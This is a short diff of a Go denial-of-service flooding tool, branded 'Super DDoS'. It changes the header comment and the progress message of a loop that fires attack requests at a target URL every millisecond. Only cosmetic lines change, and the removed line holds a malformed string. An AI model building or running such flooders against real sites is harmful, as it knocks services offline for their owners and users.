@@ -1,5 +1,5 @@
 /**
-  DDoS 
+ Super DDoS Created by ZOXC OFC
 **/
 
 package main
@@ -39,7 +39,7 @@ func main() {
 		rand.Seed(time.Now().UnixNano())
 		for i := 0; i < *count; i++ {
 			if i%4 == 0 {
-				fmt.Println("ddos Attack |", i, "ល្អ| ,completeCount, "CAT😼", errorCount)
+				fmt.Println("Strike Hit:", i, "Good:", completeCount, "Bad😼:", errorCount)
 			}
 			go startAttack(*attackUrl, *method, data)
 			time.Sleep(time.Millisecond)
